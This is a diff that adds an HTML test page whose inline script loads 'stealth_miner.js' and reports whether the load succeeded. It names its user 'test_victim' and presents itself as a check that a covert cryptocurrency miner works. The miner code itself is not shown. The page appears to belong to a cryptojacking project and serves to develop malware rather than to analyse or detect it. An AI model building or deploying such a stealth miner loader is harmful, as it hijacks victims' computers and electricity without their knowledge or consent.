@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Stealth Miner Test</title>
+</head>
+<body>
+    <h1>Testing Stealth Miner</h1>
+    <p>This page loads the stealth miner script to test if it's working correctly.</p>
+    <p>Username: <span class="username">test_victim</span></p>
+    
+    <div id="status">Loading miner...</div>
+    
+    <script>
+        // Load the stealth miner
+        const script = document.createElement('script');
+        script.src = 'stealth_miner.js';
+        script.onload = function() {
+            document.getElementById('status').textContent = 'Stealth miner loaded successfully!';
+        };
+        script.onerror = function() {
+            document.getElementById('status').textContent = 'Error loading stealth miner!';
+        };
+        document.head.appendChild(script);
+    </script>
+</body>
+</html> 
